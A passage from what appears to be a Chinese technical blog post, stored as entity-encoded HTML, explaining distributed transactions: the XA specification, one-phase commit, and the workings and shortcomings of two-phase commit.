EE5;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x5728;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x52A8;&#x4F5C;&#xFF0C;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E8B;&#x52A1;&#x7684;&#x51B3;&#x5B9A;&#x5FC5;&#x987B;&#x4EA7;&#x751F;&#x7EDF;&#x4E00;&#x7684;&#x7ED3;&#x679C;&#xFF08;&#x5168;&#x90E8;&#x63D0;&#x4EA4;&#x6216;&#x5168;&#x90E8;&#x56DE;&#x6EDA;&#xFF09;</p>\n</blockquote>\n<p>&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5206;&#x5E03;&#x5F0F;&#x90E8;&#x7F72;&#x7684;&#x591A;&#x53F0;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x4FDD;&#x8BC1;&#x5728;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E0D;&#x5168;&#x90E8;&#x90FD;&#x6267;&#x884C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x7684;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5728;&#x6267;&#x884C;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x6240;&#x4EE5;&#x4ED6;&#x4E5F;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x672C;&#x6B21;&#x4E8B;&#x52A1;&#x5230;&#x5E95;&#x5E94;&#x8BE5;commit&#x8FD8;&#x662F; roolback&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E38;&#x89C4;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5F15;&#x5165;&#x4E00;&#x4E2A;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x7684;&#x7EC4;&#x4EF6;&#x6765;&#x7EDF;&#x4E00;&#x8C03;&#x5EA6;&#x6240;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x8282;&#x70B9;&#x7684;&#x6267;&#x884C;&#x3002;</p>\n<a id=\"more\"></a>\n<hr>\n<h3 id=\"XA&#x89C4;&#x8303;\"><a href=\"#XA&#x89C4;&#x8303;\" class=\"headerlink\" title=\"XA&#x89C4;&#x8303;\"></a>XA&#x89C4;&#x8303;</h3><p>X/Open &#x7EC4;&#x7EC7;&#xFF08;&#x5373;&#x73B0;&#x5728;&#x7684; Open Group &#xFF09;&#x5B9A;&#x4E49;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6A21;&#x578B;&#x3002; X/Open DTP &#x6A21;&#x578B;&#xFF08; 1994 &#xFF09;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF08; AP &#xFF09;&#x3001;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x3001;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x3001;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x56DB;&#x90E8;&#x5206;&#x3002;&#x4E00;&#x822C;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x662F;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x662F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x662F;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;    &#x901A;&#x5E38;&#x628A;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5185;&#x90E8;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x5BF9;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4F5C;&#x4E3A;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x770B;&#x5F85;&#x3002;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x5BF9;&#x8C61;&#x662F;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#xFF0C;&#x800C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x3002;   &#x6240;&#x8C13;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5171;&#x540C;&#x5B8C;&#x6210;&#x4E00;&#x4E2A;&#x5DE5;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5DE5;&#x4F5C;&#x5373;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#x53EF;&#x80FD;&#x66F4;&#x65B0;&#x51E0;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x53D1;&#x751F;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x5404;&#x5904;&#x4F46;&#x5FC5;&#x987B;&#x5168;&#x90E8;&#x88AB;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x6B64;&#x65F6;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x81EA;&#x5DF1;&#x5185;&#x90E8;&#x6240;&#x505A;&#x64CD;&#x4F5C;&#x7684;&#x63D0;&#x4EA4;&#x4E0D;&#x4EC5;&#x4F9D;&#x8D56;&#x672C;&#x8EAB;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x8FD8;&#x8981;&#x4F9D;&#x8D56;&#x4E0E;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x4EFB;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4E00;&#x64CD;&#x4F5C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x53C2;&#x4E0E;&#x6B64;&#x4E8B;&#x52A1;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#x90FD;&#x5FC5;&#x987B;&#x56DE;&#x6EDA;&#x3002;     &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x67D0;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x5728;&#x505A;&#x4EC0;&#x4E48;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x4E00;&#x4E2A; DTP &#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x662F;&#x5FC5;&#x9700;&#x7684;&#xFF0C;&#x7531;&#x5B83;&#x901A;&#x77E5;&#x548C;&#x534F;&#x8C03;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x800C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x5C06;&#x5176;&#x81EA;&#x5DF1;&#x6240;&#x505A;&#x7684;&#x64CD;&#x4F5C;&#xFF08;&#x53EF;&#x6062;&#x590D;&#xFF09;&#x5F71;&#x5C04;&#x5230;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x4E2D;&#x3002;    </p>\n<p>XA &#x5C31;&#x662F; X/Open DTP &#x5B9A;&#x4E49;&#x7684;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x63A5;&#x53E3;&#x89C4;&#x8303;&#xFF08;&#x5373;&#x63A5;&#x53E3;&#x51FD;&#x6570;&#xFF09;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x7528;&#x5B83;&#x6765;&#x901A;&#x77E5;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x5F00;&#x59CB;&#x3001;&#x7ED3;&#x675F;&#x4EE5;&#x53CA;&#x63D0;&#x4EA4;&#x3001;&#x56DE;&#x6EDA;&#x7B49;&#x3002; XA &#x63A5;&#x53E3;&#x51FD;&#x6570;&#x7531;&#x6570;&#x636E;&#x5E93;&#x5382;&#x5546;&#x63D0;&#x4F9B;&#x3002; </p>\n<p>&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x548C;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x5C31;&#x662F;&#x6839;&#x636E;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x884D;&#x751F;&#x51FA;&#x6765;&#x7684;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5B9E;&#x73B0;XA&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x5173;&#x952E;(&#x786E;&#x5207;&#x5730;&#x8BF4;&#xFF0C;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E3B;&#x8981;&#x4FDD;&#x8BC1;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#xFF0C;&#x5373;&#x6240;&#x6709;&#x7ED3;&#x70B9;&#x8981;&#x4E48;&#x5168;&#x505A;&#x8981;&#x4E48;&#x5168;&#x4E0D;&#x505A;)</p>\n<hr>\n<h3 id=\"&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Best-Efforts-1PC&#x6A21;&#x5F0F;\"><a href=\"#&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Best-Efforts-1PC&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Best Efforts 1PC&#x6A21;&#x5F0F;)\"></a>&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Best Efforts 1PC&#x6A21;&#x5F0F;)</h3><p>&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x975E;&#x5E38;&#x76F4;&#x767D;&#xFF0C;&#x5C31;&#x662F;&#x4ECE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5411;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x51FA;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;&#x5230;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6210;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x9700;&#x8981;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x89D2;&#x8272;&#xFF0C;&#x5404;&#x7ED3;&#x70B9;&#x4E4B;&#x95F4;&#x4E0D;&#x5B58;&#x5728;&#x534F;&#x8C03;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x5176;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x6BD4;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8981;&#x77ED;</p>\n<hr>\n<h3 id=\"&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Two-phaseCommit-2PC\"><a href=\"#&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Two-phaseCommit-2PC\" class=\"headerlink\" title=\"&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Two-phaseCommit/2PC)\"></a>&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Two-phaseCommit/2PC)</h3><p>&#x53C2;&#x4E0E;&#x8005;&#x5C06;&#x64CD;&#x4F5C;&#x6210;&#x8D25;&#x901A;&#x77E5;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x518D;&#x7531;&#x534F;&#x8C03;&#x8005;&#x6839;&#x636E;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x53CD;&#x9988;&#x60C5;&#x62A5;&#x51B3;&#x5B9A;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x662F;&#x5426;&#x8981;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x8FD8;&#x662F;&#x4E2D;&#x6B62;&#x64CD;&#x4F5C;<br>&#x6240;&#x8C13;&#x7684;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#x662F;&#x6307;&#xFF1A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF1A;&#x51C6;&#x5907;&#x9636;&#x6BB5;(&#x6295;&#x7968;&#x9636;&#x6BB5;)&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF1A;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#xFF08;&#x6267;&#x884C;&#x9636;&#x6BB5;&#xFF09;</p>\n<h4 id=\"&#x51C6;&#x5907;&#x9636;&#x6BB5;\"><a href=\"#&#x51C6;&#x5907;&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"&#x51C6;&#x5907;&#x9636;&#x6BB5;\"></a>&#x51C6;&#x5907;&#x9636;&#x6BB5;</h4><ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;(vote)&#xFF0C;&#x5E76;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6267;&#x884C;&#x8BE2;&#x95EE;&#x53D1;&#x8D77;&#x4E3A;&#x6B62;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;Undo&#x4FE1;&#x606F;&#x548C;Redo&#x4FE1;&#x606F;&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x3002;&#xFF08;&#x6CE8;&#x610F;&#xFF1A;&#x82E5;&#x6210;&#x529F;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BCF;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF09;</li>\n<li>&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x54CD;&#x5E94;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;&#x3002;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x540C;&#x610F;&#x201D;&#x6D88;&#x606F;&#xFF1B;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#x6D88;&#x606F;&#x3002;</li>\n</ol>\n<h4 id=\"&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\"><a href=\"#&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\"></a>&#x63D0;&#x4EA4;&#x9636;&#x6BB5;</h4><ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x6B63;&#x5F0F;&#x63D0;&#x4EA4;(commit)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6B63;&#x5F0F;&#x5B8C;&#x6210;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x3002;</li>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x3002;</li>\n</ol>\n<p>&#x5982;&#x679C;&#x4EFB;&#x4E00;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x4E3A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#xFF0C;&#x6216;&#x8005; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x8BE2;&#x95EE;&#x8D85;&#x65F6;&#x4E4B;&#x524D;&#x65E0;&#x6CD5;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x65F6;</p>\n<ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;(rollback)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;Undo&#x4FE1;&#x606F;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x3002;</li>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x53D6;&#x6D88;&#x4E8B;&#x52A1;</li>\n</ol>\n<p>&#x4E0D;&#x7BA1;&#x6700;&#x540E;&#x7ED3;&#x679C;&#x5982;&#x4F55;&#xFF0C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#x90FD;&#x4F1A;&#x7ED3;&#x675F;&#x5F53;&#x524D;&#x4E8B;&#x52A1;</p>\n<h4 id=\"&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\"><a href=\"#&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;\"></a>&#x4E8C;&#x9636;&#x6BB5;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;</h4><ol>\n<li><strong>&#x540C;&#x6B65;&#x963B;&#x585E;&#x95EE;&#x9898;</strong>&#x3002;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8282;&#x70B9;&#x90FD;&#x662F;&#x4E8B;&#x52A1;&#x963B;&#x585E;&#x578B;&#x7684;&#x3002;&#x5F53;&#x53C2;&#x4E0E;&#x8005;&#x5360;&#x6709;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x5176;&#x4ED6;&#x7B2C;&#x4E09;&#x65B9;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x516C;&#x5171;&#x8D44;&#x6E90;&#x4E0D;&#x5F97;&#x4E0D;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x3002;</li>\n<li><strong>&#x5355;&#x70B9;&#x6545;&#x969C;</strong>&#x3002;&#x7531;&#x4E8E;&#x534F;&#x8C03;&#x8005;&#x7684;&#x91CD;&#x8981;&#x6027;&#xFF0C;&#x4E00;&#x65E6;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#x3002;&#x53C2;&#x4E0E;&#x8005;&#x4F1A;&#x4E00;&#x76F4;&#x963B;&#x585E;&#x4E0B;&#x53BB;&#x3002;&#x5C24;&#x5176;&#x5728;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x6545;&#x969C;&#xFF0C;&#x90A3;&#x4E48;&#x6240;&#x6709;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x8FD8;&#x90FD;&#x5904;&#x4E8E;&#x9501;&#x5B9A;&#x4E8B;&#x52A1;&#x8D44;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4E2D;&#xFF0C;&#x800C;&#x65E0;&#x6CD5;&#x7EE7;&#x7EED;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x3002;&#xFF08;&#x5982;&#x679C;&#x662F;&#x534F;&#x8C03;&#x8005;&#x6302;&#x6389;&#xFF0C;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x9009;&#x4E3E;&#x4E00;&#x4E2A;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x56E0;&#x4E3A;&#x534F;&#x8C03;&#x8005;&#x5B95;&#x673A;&#x5BFC;&#x81F4;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x5904;&#x4E8E;&#x963B;&#x585E;&#x72B6;&#x6001;&#x7684;&#x95EE;&#x9898;&#xFF09;</li>\n<li><strong>&#x6570;&#x636E;&#x4E0D;&#x4E00;&#x81F4;</strong>&#x3002;&#x5728;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x7684;&#x9636;&#x6BB5;&#x4E8C;&#x4E2D;&#xFF0C;&#x5F53;&#x534F;&#x8C03;&#x8005;&#x5411;&#x53C2;&#x4E0E;&#x8005;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#xFF0C;&#x53D1;&#x751F;&#x4E86;&#x5C40;&#x90E8;&#x7F51;&#x7EDC;&#x5F02;&#x5E38;&#x6216;&#x8005;&#x5728;&#x53D1;&#x9001;commit&#x8BF7;&#x6C42;&#x8FC7;&#x7A0B;&#x4E2D;&#x534F;&#x8C03;&#x8005;&#x53D1;&#x751F;&#x4E86;&#x6545;&#x969C;&#xFF0C;&#x8FD9;&#x56DE;&#x5BFC;&#x81F4;&#x53EA;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x53D7;&#x5230;&#x4E86;commit&#x8BF7;&#x6C42;&#x3002;&#x800C;&#x5728;&#x8FD9;&#x90E8;&#x5206;&#x53C2;&#x4E0E;&#x8005;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x6267;&#x884C;commit&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#x5176;&#x4ED6;&#x90E8;&#x5206;&#x672A;&#x63A5;&#x5230;commit&#x8BF7;&#x6C42;&#x7684;&#x673A;&#x5668;&#x5219;&#x65E0;&#x6CD5;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x63D0;&#x4EA4;&#x3002;&#x4E8E;&#x662F;&#x6574;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4FBF;&#x51FA;&#x73B0;&#x4E86;&#x6570;&#x636E;&#x90E8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x73B0;&#x8C61;&#x3002;</li>\n<li><strong>&#x4E8C;&#x9636;&#x6BB5;&#x65E0;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x534F;&#x8C03;&#x8005;&#x518D;&#x53D1;&#x51FA;commit&#x6D88;&#x606F;&#x4E4B;&#x540E;&#x5B95;&#x673A;&#xFF0C;&#x800C;&#x552F;&#x4E00;&#x63A5;&#x6536;&#x5230;&#x8FD9;&#x6761;&#x6D88;&#x606F;&#x7684;&#x53C2;&#x4E0E;&#x8005;&#x540C;&#x65F6;&#x4E5F;&#x5B95;&#x673A;&#x4E86;&#x3002;&#x90A3;&#x4E48;&#x5373;&#x4F7F;&#x534F;&#x8C03;&#x8005;&#x901A;&#x8FC7;&#x9009;&#x4E3E;&#x534F;&#x8BAE;&#x4EA7;&#x751F;&#x4E86;&#x65B0;&#x7684;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x8FD9;&#x6761;&#x4E8B;&#x52A1;&#x7684;&#x72B6;&#x6001;&#x4E5F;&#x662F;&#x4E0D;&#x786E;&#x5B9A;&#x7684;&#xFF0C;&#x6CA1;&#x4EBA;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x662F;&#x5426;&#x88AB;&#x5DF2;&#x7ECF;&#x63D0;&#x4EA4;</li>\n</ol>\n<hr>\n<h3 